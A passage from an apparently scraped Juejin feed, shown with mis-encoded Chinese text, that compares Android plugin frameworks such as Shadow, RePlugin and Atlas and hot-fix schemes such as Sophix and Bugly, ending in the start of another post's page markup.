<h4 data-id="heading-8">2.1.2 å…¨åŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„å’ŒéåŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„</h4>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯å…¨åŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„ï¼Ÿæˆ‘ä»¬å’ŒéåŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„è¿›è¡Œå¯¹æ¯”çœ‹çœ‹ã€‚</p>
<ol>
<li>éåŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8caf7a1d888240768faf4ebdf72396ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZmG5Lia6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766307783&amp;x-signature=iLBxzO5RnhwQ3HzAvGIRRM054Og%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ol start="2">
<li>å…¨åŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„å›¾</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/261fe4ff0e2046398ceb3464151fa565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZmG5Lia6IGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766307783&amp;x-signature=RcxVW6cfdIMjWi4YVz%2B92syGFb4%3D" alt="å…¨åŠ¨æ€æ’ä»¶æ¡†æ¶æ¶æ„å›¾" loading="lazy"/></p>
<h4 data-id="heading-9">2.1.3 Shadowä¸»è¦æ¨¡å—åˆ’åˆ†</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[å®¿ä¸»åº”ç”¨] --&gt;|åŒ…å«| B[åŸºç¡€æ¥å£]
    A --&gt;|æ³¨å†Œ| C[å£³å­ä»£ç†ç»„ä»¶]
    A --&gt;|é›†æˆ| D[æ’ä»¶ç®¡ç†å™¨]
    D --&gt;|ç®¡ç†| E[æ’ä»¶åŒ…]
    E --&gt;|åŒ…å«| F[åŠ è½½å™¨]
    E --&gt;|åŒ…å«| G[è¿è¡Œæ—¶]
    E --&gt;|åŒ…å«| H[ä¸šåŠ¡App]
    D --&gt;|é€šè¿‡Binderæ§åˆ¶| F
    F --&gt;|åŠ è½½| H
    G --&gt;|æ”¯æŒ| H
</code></pre>
<p><strong>å®¿ä¸»åº”ç”¨</strong></p>
<p>å®¿ä¸»åº”ç”¨æ˜¯Shadowæ¡†æ¶çš„åŸºç¡€è½½ä½“ï¼Œä»…åŒ…å«æœ€å°åŒ–çš„æ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li>åŸºç¡€æ¥å£å®šä¹‰</li>
<li>å£³å­ä»£ç†ç»„ä»¶ï¼ˆåœ¨Manifestä¸­æ³¨å†Œï¼‰</li>
<li>æ’ä»¶ç®¡ç†å™¨çš„åŠ¨æ€å‡çº§é€»è¾‘
ä»£ç é‡æ§åˆ¶åœ¨çº¦15KBï¼Œä¿æŒè½»é‡åŒ–è®¾è®¡ã€‚</li>
</ul>
<p><strong>æ’ä»¶ç®¡ç†å™¨ï¼ˆManagerï¼‰</strong></p>
<p>æ’ä»¶ç®¡ç†å™¨è´Ÿè´£æ’ä»¶çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼š</p>
<ul>
<li>æ’ä»¶çš„ä¸‹è½½ä¸å®‰è£…</li>
<li>Loadingæ€çš„åŠ¨æ€è§†å›¾å±•ç¤º</li>
<li>é€šè¿‡Binderé€šä¿¡æœºåˆ¶æ§åˆ¶åŠ è½½å™¨</li>
<li>ç®¡ç†å¤šç‰ˆæœ¬loaderå®ä¾‹çš„è¿è¡Œ</li>
</ul>
<p><strong>æ ¸å¿ƒè¿è¡Œæ—¶æ¨¡å—</strong></p>
<p>æ ¸å¿ƒè¿è¡Œæ—¶æ¨¡å—ä½œä¸ºæ’ä»¶çš„ä¸€éƒ¨åˆ†å¯åŠ¨æ€å‡çº§ï¼ŒåŒ…å«ä¸¤ä¸ªå­æ¨¡å—ï¼š</p>
<p><strong>1. åŠ è½½å™¨ï¼ˆLoaderï¼‰</strong></p>
<ul>
<li>å®ç°ä¸šåŠ¡Appçš„åŠ¨æ€åŠ è½½</li>
<li>é€šè¿‡Binderæ¥å£æ¥æ”¶ç®¡ç†å™¨æŒ‡ä»¤</li>
<li>æ”¯æŒå¤šå®ä¾‹è¿è¡Œï¼Œé¿å…nativeåº“å†²çª</li>
<li>å¯åŒ…å«é’ˆå¯¹ä¸šåŠ¡çš„ç‰¹æ®Šå¤„ç†é€»è¾‘</li>
</ul>
<p><strong>2. è¿è¡Œæ—¶ï¼ˆRuntimeï¼‰</strong></p>
<ul>
<li>æä¾›æ’ä»¶è¿è¡Œçš„åŸºç¡€ç¯å¢ƒ</li>
<li>ä¸ä¸šåŠ¡AppåŒç‰ˆæœ¬ç¼–è¯‘</li>
<li>ç¡®ä¿æ’ä»¶ä¸å®¿ä¸»çš„è§£è€¦è¿è¡Œ</li>
</ul>
<h4 data-id="heading-10">2.1.4 å°ç»“</h4>
<ul>
<li>ä¼˜ç‚¹ï¼šä¸ä¿®æ”¹APKï¼Œæ’ä»¶ä¹‹é—´å®Œå…¨éš”ç¦»ï¼ŒåŠ¨æ€åŠ è½½å’Œå¸è½½æ’ä»¶ï¼Œå¯¹Android APIçš„æ”¯æŒéå¸¸å…¨é¢ã€‚</li>
<li>ç¼ºç‚¹ï¼šå®ç°å¤æ‚ï¼Œæ–‡æ¡£ç›¸å¯¹è¾ƒå°‘ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›ç‰¹æ®Šçš„é—®é¢˜ï¼Œéœ€è¦è¿›è¡Œæ›´å¤šçš„æµ‹è¯•æ¥ç¡®ä¿ç¨³å®šæ€§ã€‚</li>
<li>é€‰æ‹©å»ºè®®ï¼šå¦‚æœéœ€è¦ä¸€ä¸ªå¼ºå¤§ä¸”çµæ´»çš„æ’ä»¶åŒ–æ¡†æ¶ï¼Œå¹¶ä¸”ä¸ä»‹æ„è€—è´¹æ›´å¤šçš„æ—¶é—´æ¥ç†è§£å’Œä½¿ç”¨ï¼Œé‚£ä¹ˆShadowå¯èƒ½æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</li>
</ul>
<h3 data-id="heading-11">2.2 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FQihoo360%2FRePlugin" target="_blank" title="https://github.com/Qihoo360/RePlugin" ref="nofollow noopener noreferrer">RePlugin</a></h3>
<p>RePluginæ˜¯360å…¬å¸å¼€å‘çš„ä¸€æ¬¾æ’ä»¶åŒ–æ¡†æ¶ï¼Œå®ƒé€šè¿‡ä¿®æ”¹ClassLoaderï¼Œå®ç°äº†æ’ä»¶çš„åŠ¨æ€åŠ è½½å’Œå¸è½½ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šæ’ä»¶åŒ–å’Œç»„ä»¶åŒ–å¹¶è¡Œï¼Œæ— éœ€ä¿®æ”¹å·²æœ‰ä»£ç ï¼Œæ’ä»¶é—´é€šä¿¡æœºåˆ¶å®Œå–„ã€‚</li>
<li>ç¼ºç‚¹ï¼šéœ€è¦å¯¹æ’ä»¶è¿›è¡Œç‰¹æ®Šçš„æ‰“åŒ…å¤„ç†ï¼Œå¯¹äºä¸€äº›å¤æ‚çš„åœºæ™¯ï¼Œå¯èƒ½éœ€è¦è¿›è¡Œè¾ƒå¤§çš„æ”¹åŠ¨ï¼Œå¯¹æ–°çš„Androidç‰ˆæœ¬çš„æ”¯æŒå¯èƒ½ä¼šæœ‰å»¶è¿Ÿã€‚</li>
<li>é€‰æ‹©å»ºè®®ï¼šå¦‚æœéœ€è¦ä¸€ä¸ªç¨³å®šä¸”æˆç†Ÿçš„æ’ä»¶åŒ–æ¡†æ¶ï¼Œå¹¶ä¸”å¸Œæœ›èƒ½å¤Ÿå¿«é€Ÿåœ°è¿›è¡Œæ’ä»¶åŒ–å¼€å‘ï¼Œé‚£ä¹ˆå»ºè®®é€‰æ‹©RePluginã€‚</li>
</ul>
<h3 data-id="heading-12">2.3 AAB (Android App Bundle)</h3>
<p>AABæ˜¯Googleå®˜æ–¹æä¾›çš„ä¸€ç§æ–°çš„åº”ç”¨å‘å¸ƒæ ¼å¼ï¼Œå®ƒå…è®¸å°†åº”ç”¨çš„åŠŸèƒ½æ¨¡å—åŒ–ï¼Œå¹¶åœ¨éœ€è¦æ—¶åŠ¨æ€åœ°ä¸‹è½½å’Œå®‰è£…è¿™äº›æ¨¡å—ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šGoogleå®˜æ–¹æ”¯æŒï¼Œä¸Androidç³»ç»Ÿå’ŒGoogle Playå•†åº—çš„é›†æˆåº¦é«˜ï¼Œå¯ä»¥å®ç°æŒ‰éœ€ä¸‹è½½å’Œå®‰è£…æ¨¡å—ã€‚</li>
<li>ç¼ºç‚¹ï¼šåªæ”¯æŒAndroid 5.0åŠä»¥ä¸Šç‰ˆæœ¬çš„è®¾å¤‡ï¼Œéœ€è¦é€šè¿‡Google Playå•†åº—è¿›è¡Œæ¨¡å—çš„ä¸‹è½½å’Œå®‰è£…ã€‚</li>
<li>é€‰æ‹©å»ºè®®ï¼šå¦‚æœåº”ç”¨ä¸»è¦é’ˆå¯¹çš„æ˜¯æœ‰Google PlayæœåŠ¡çš„è®¾å¤‡æˆ–åœ°åŒºï¼Œå¹¶ä¸”å¸Œæœ›èƒ½å¤Ÿå‡å°åº”ç”¨çš„åˆå§‹ä¸‹è½½å¤§å°ï¼Œé‚£ä¹ˆå»ºè®®é€‰æ‹©AABã€‚</li>
</ul>
<h3 data-id="heading-13">2.4 Qigsaw</h3>
<p>Qigsawæ˜¯çˆ±å¥‡è‰ºå¼€å‘çš„ä¸€æ¬¾æ’ä»¶åŒ–æ¡†æ¶ï¼Œå®ƒé€šè¿‡ä¿®æ”¹ClassLoaderï¼Œå®ç°äº†æ’ä»¶çš„åŠ¨æ€åŠ è½½å’Œå¸è½½ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šæ”¯æŒåŠ¨æ€åŠ è½½å’Œå¸è½½æ’ä»¶ï¼Œæ”¯æŒçƒ­æ›´æ–°ï¼Œæ”¯æŒåˆ†åŒ…ã€‚</li>
<li>ç¼ºç‚¹ï¼šå®ç°ç›¸å¯¹å¤æ‚ï¼Œéœ€è¦å¯¹æ’ä»¶è¿›è¡Œç‰¹æ®Šçš„æ‰“åŒ…å¤„ç†ï¼Œå¯¹æ–°çš„Androidç‰ˆæœ¬çš„æ”¯æŒå¯èƒ½ä¼šæœ‰å»¶è¿Ÿã€‚</li>
<li>é€‰æ‹©å»ºè®®ï¼šå¦‚æœéœ€è¦ä¸€ä¸ªæ”¯æŒçƒ­æ›´æ–°å’Œåˆ†åŒ…çš„æ’ä»¶åŒ–æ¡†æ¶ï¼Œå¹¶ä¸”æ„¿æ„è€—è´¹æ›´å¤šçš„æ—¶é—´æ¥ç†è§£å’Œä½¿ç”¨ï¼Œé‚£ä¹ˆå»ºè®®é€‰æ‹©Qigsawã€‚</li>
</ul>
<h3 data-id="heading-14">2.5 Atlas</h3>
<p>Atlasæ˜¯é˜¿é‡Œå·´å·´å¼€å‘çš„ä¸€æ¬¾æ’ä»¶åŒ–æ¡†æ¶ï¼Œå®ƒé€šè¿‡ä¿®æ”¹ClassLoaderï¼Œå®ç°äº†æ’ä»¶çš„åŠ¨æ€åŠ è½½å’Œå¸è½½ã€‚å®˜æ–¹çš„ä»‹ç»æ–‡ç« å¯ä»¥é˜…è¯»<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzAxNDEwNjk5OQ%3D%3D%26mid%3D2650400348%26idx%3D1%26sn%3D99bc1bce932c5b9000d5b54afa2de70e" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzAxNDEwNjk5OQ==&amp;mid=2650400348&amp;idx=1&amp;sn=99bc1bce932c5b9000d5b54afa2de70e" ref="nofollow noopener noreferrer">Atlas-æ‰‹æ·˜ç»„ä»¶åŒ–æ¡†æ¶çš„å‰ä¸–ä»Šç”Ÿå’Œæœªæ¥çš„è·¯</a>ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼šåŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒçƒ­æ›´æ–°ï¼Œå¯ä»¥åŠ¨æ€åŠ è½½å’Œå¸è½½æ’ä»¶ï¼Œæ”¯æŒæ’ä»¶ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ï¼Œæœ‰ä¸°å¯Œçš„æ–‡æ¡£å’Œç¤¾åŒºæ”¯æŒã€‚</li>
<li>ç¼ºç‚¹ï¼šå®ç°å¤æ‚ï¼Œå¯èƒ½éœ€è¦ä¿®æ”¹å¤§é‡çš„ä»£ç æ‰èƒ½å®ç°æ’ä»¶åŒ–ã€‚</li>
<li>é€‰æ‹©å»ºè®®ï¼šç›®å‰Atlaså¼€æºé¡¹ç›®å¤„äºæ²¡æœ‰ç»´æŠ¤çš„çŠ¶æ€ï¼Œåªèƒ½ä½œä¸ºæŠ€æœ¯æ–¹æ¡ˆå‚è€ƒã€‚</li>
</ul>
<h2 data-id="heading-15">ä¸‰ã€æ’ä»¶å¢é‡æ›´æ–°</h2>
<p>æ’ä»¶ç»´æŠ¤é˜¶æ®µï¼Œå¤§çš„éœ€æ±‚å˜æ›´è¾ƒå°‘ï¼Œå¾ˆå¤šæ—¶å€™æ›´æ–°æ’ä»¶ç‰ˆæœ¬åªæ˜¯ä¸ºäº†è§£å†³ä¸€äº›ç”¨æˆ·åé¦ˆçš„å°é—®é¢˜ã€‚ä½†å³ä½¿æ˜¯å¾ˆå°çš„æ›´æ–°ï¼Œéƒ½éœ€è¦æ’ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬ï¼Œç”¨æˆ·æ›´æ–°-ä¸‹è½½-å®‰è£…è¿™äº›æ­¥éª¤ä¸­ï¼Œéƒ½ä¼šé€ æˆç”¨æˆ·çš„æµå¤±ã€‚é‚£æœ‰æ²¡æœ‰å¯èƒ½å¯¹æ’ä»¶è¿›è¡Œçƒ­æ›´æ–°å‘¢ï¼Ÿåªéœ€è¦ä¸‹å‘å°çš„è¡¥ä¸æ–‡ä»¶å³å¯ä»¥è¾¾åˆ°ä¿®å¤çš„èƒ½åŠ›ç¡®å®æ›´é€‚åˆæˆ‘ä»¬ä¸šåŠ¡åœºæ™¯ã€‚ç›®å‰æ¯”è¾ƒæµè¡Œçš„çƒ­æ›´æ–°æ–¹æ¡ˆæœ‰ä¸‹é¢è¿™äº›ã€‚</p>
<h3 data-id="heading-16">3.1 Sophix</h3>
<p>Sophixæ˜¯é˜¿é‡Œå·´å·´æ¨å‡ºçš„ä¸€æ¬¾çƒ­ä¿®å¤æ–¹æ¡ˆã€‚Sophixçš„åŸºæœ¬åŸç†æ˜¯é€šè¿‡AndFixå®ç°çš„ï¼ŒAndFixæ˜¯ä¸€ç§åœ¨Android Dalvik/ARTç¯å¢ƒä¸‹çš„çƒ­è¡¥ä¸æ¡†æ¶ï¼Œå®ƒå¯ä»¥åœ¨ä¸éœ€è¦é‡å¯APPçš„æƒ…å†µä¸‹åŠ¨æ€ä¿®å¤Classã€‚</p>
<ul>
<li>ä¼˜ç‚¹
<ul>
<li>æ”¯æŒå…¨é‡æ›´æ–°ï¼Œå¢é‡æ›´æ–°ï¼Œçƒ­æ›´æ–°ï¼Œæ”¯æŒSoåº“ä¿®å¤ã€‚</li>
<li>æä¾›äº†è¯¦ç»†çš„æ¥å…¥æ–‡æ¡£å’Œç¨³å®šçš„æœåŠ¡æ”¯æŒã€‚</li>
<li>æœ‰è¾ƒå¥½çš„å…¼å®¹æ€§å’Œç¨³å®šæ€§ã€‚</li>
</ul>
</li>
<li>ç¼ºç‚¹
<ul>
<li>åªæ”¯æŒé˜¿é‡Œç³»çš„åº”ç”¨ï¼Œå¯¹å¤–éƒ¨åº”ç”¨æ”¯æŒä¸è¶³ã€‚</li>
<li>éœ€è¦æ¥å…¥é˜¿é‡Œçš„mPaaSç§»åŠ¨å¼€å‘å¹³å°ï¼Œå¯¹äºä¸€äº›ä¸å¸Œæœ›æ¥å…¥é˜¿é‡Œäº‘çš„é¡¹ç›®å¯èƒ½ä¼šæœ‰å½±å“ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-17">3.2 Bugly hotfix</h3>
<p>Bugly hotfixæ˜¯è…¾è®¯æ¨å‡ºçš„ä¸€æ¬¾çƒ­ä¿®å¤æ–¹æ¡ˆã€‚Bugly hotfixçš„åŸºæœ¬åŸç†æ˜¯é€šè¿‡dexæ–‡ä»¶æ›¿æ¢å®ç°çš„ï¼Œå®ƒä¼šåœ¨è¿è¡Œæ—¶æ›¿æ¢æ‰æœ‰é—®é¢˜çš„dexæ–‡ä»¶ï¼Œä»è€Œå®ç°çƒ­ä¿®å¤ã€‚</p>
<ul>
<li>ä¼˜ç‚¹
<ul>
<li>æä¾›äº†å…¨é¢çš„çƒ­æ›´æ–°è§£å†³æ–¹æ¡ˆï¼ŒåŒ…æ‹¬çƒ­ä¿®å¤å’Œçƒ­æ›´æ–°ã€‚</li>
<li>æä¾›äº†è¯¦ç»†çš„æ¥å…¥æ–‡æ¡£å’Œç¨³å®šçš„æœåŠ¡æ”¯æŒã€‚</li>
<li>æœ‰è¾ƒå¥½çš„å…¼å®¹æ€§å’Œç¨³å®šæ€§ã€‚</li>
</ul>
</li>
<li>ç¼ºç‚¹
<ul>
<li>éœ€è¦æ¥å…¥è…¾è®¯çš„Buglyå¹³å°ï¼Œå¯¹äºä¸€äº›ä¸å¸Œæœ›æ¥å…¥è…¾è®¯äº‘çš„é¡¹ç›®å¯èƒ½ä¼šæœ‰å½±å“ã€‚</li>
<li>å¯¹äºä¸€äº›å¤æ‚çš„ä¿®å¤åœºæ™¯ï¼Œå¯èƒ½éœ€è¦æ›´æ·±å…¥çš„å®šåˆ¶ï¼Œè¿™å¯èƒ½ä¼šå¢åŠ æ¥å…¥çš„å¤æ‚æ€§ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-18">3.3 æ’æ¡©çƒ­æ›´æ–°</h3>
<p>æ’æ¡©çƒ­æ›´æ–°æ˜¯ä¸€ç§åŸºäºå­—èŠ‚ç æ’æ¡©æŠ€æœ¯çš„çƒ­æ›´æ–°æ–¹æ¡ˆã€‚æ’æ¡©çƒ­æ›´æ–°çš„åŸºæœ¬åŸç†æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µä¿®æ”¹å­—èŠ‚ç ï¼Œä¸ºæ–¹æ³•è°ƒç”¨æ’å…¥é¢å¤–çš„é€»è¾‘ï¼Œä»è€Œå®ç°åœ¨è¿è¡Œæ—¶æ›¿æ¢æ–¹æ³•çš„åŠŸèƒ½ã€‚</p>
<ul>
<li>ä¼˜ç‚¹
<ul>
<li>åŸç†ç®€å•ï¼Œå®ç°ç›¸å¯¹å®¹æ˜“ã€‚</li>
<li>ä¸ä¾èµ–äºä»»ä½•ç¬¬ä¸‰æ–¹å¹³å°ï¼Œå¯ä»¥è‡ªç”±å®šåˆ¶ã€‚</li>
</ul>
</li>
<li>ç¼ºç‚¹
<ul>
<li>éœ€è¦å¯¹å­—èŠ‚ç æ’æ¡©æŠ€æœ¯æœ‰ä¸€å®šçš„äº†è§£ï¼Œå¯¹äºä¸€äº›å¼€å‘è€…æ¥è¯´å¯èƒ½ä¼šæœ‰ä¸€å®šçš„å­¦ä¹ æˆæœ¬ã€‚</li>
<li>å¯¹äºä¸€äº›å¤æ‚çš„ä¿®å¤åœºæ™¯ï¼Œå¯èƒ½éœ€è¦æ›´æ·±å…¥çš„å®šåˆ¶ï¼Œè¿™å¯èƒ½ä¼šå¢åŠ æ¥å…¥çš„å¤æ‚æ€§ã€‚</li>
<li>å…¼å®¹æ€§å’Œç¨³å®šæ€§å¯èƒ½ä¸å¦‚Sophixå’ŒBugly hotfixã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-19">å››ã€æ€»ç»“</h2>
<p>åœ¨åŸç†éƒ¨åˆ†ï¼Œæœ¬æ–‡è§£é‡Šäº†ç±»åŠ è½½å™¨çš„ä½œç”¨å’Œæ’ä»¶åŒ–çš„åŸºæœ¬åŸç†ï¼Œè¿™ä¸ºç†è§£åç»­çš„æ’ä»¶åŒ–æ–¹æ¡ˆæ‰“ä¸‹äº†åŸºç¡€ã€‚</p>
<p>åœ¨æ’ä»¶åŒ–æ–¹æ¡ˆéƒ¨åˆ†ï¼Œæœ¬æ–‡ä»‹ç»äº†Shadowã€RePluginã€AABã€Qigsawå’ŒAtlasè¿™äº”ç§ä¸»æµçš„æ’ä»¶åŒ–æ–¹æ¡ˆã€‚æ¯ç§æ–¹æ¡ˆéƒ½æœ‰å…¶ç‹¬ç‰¹çš„ä¼˜ç‚¹å’Œé€‚ç”¨åœºæ™¯ï¼Œä¾‹å¦‚Shadowçš„å…¨åŠ¨æ€å®ç°ã€RePluginçš„ç¨³å®šæ€§å’Œæˆç†Ÿåº¦ã€AABçš„å®˜æ–¹æ”¯æŒå’Œä¸Google Playçš„é›†æˆåº¦ã€Qigsawçš„çƒ­æ›´æ–°å’Œåˆ†åŒ…æ”¯æŒï¼Œä»¥åŠAtlasçš„åŠŸèƒ½å¼ºå¤§å’Œä¸°å¯Œçš„æ–‡æ¡£æ”¯æŒã€‚</p>
<p>åœ¨æ’ä»¶å¢é‡æ›´æ–°éƒ¨åˆ†ï¼Œæœ¬æ–‡ä»‹ç»äº†Sophixã€Bugly hotfixå’Œæ’æ¡©çƒ­æ›´æ–°è¿™ä¸‰ç§çƒ­æ›´æ–°æ–¹æ¡ˆã€‚è¿™äº›æ–¹æ¡ˆå¯ä»¥åœ¨ä¸éœ€è¦ç”¨æˆ·é‡æ–°ä¸‹è½½å’Œå®‰è£…åº”ç”¨çš„æƒ…å†µä¸‹ä¿®å¤é—®é¢˜ï¼Œå¤§å¤§æé«˜äº†ç”¨æˆ·ä½“éªŒã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®è‡ªå·±çš„å…·ä½“éœ€æ±‚å’Œé¡¹ç›®æƒ…å†µï¼Œç»¼åˆè€ƒè™‘å„ç§å› ç´ ï¼Œé€‰æ‹©æœ€é€‚åˆçš„æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ‰åœ¨è°ƒåº¦çš„èŠ±å›­é‡Œé¢æŒ–å‘€æŒ–]]></title>    <link>https://juejin.cn/post/7582951344518201350</link>    <guid>https://juejin.cn/post/7582951344518201350</guid>    <pubDate>2025-12-14T12:39:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582951344518201350" data-draft-id="7583226204033728553" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ‰åœ¨è°ƒåº¦çš„èŠ±å›­é‡Œé¢æŒ–å‘€æŒ–"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-14T12:39:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ‰åœ¨è°ƒåº¦çš„èŠ±å›­é‡Œé¢æŒ–å‘€æŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ‰æ€åº¦çš„ä¸‹ç­‰é©¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T12:39:58.000Z" title="Sun Dec 14 2025 12:39:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    28
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 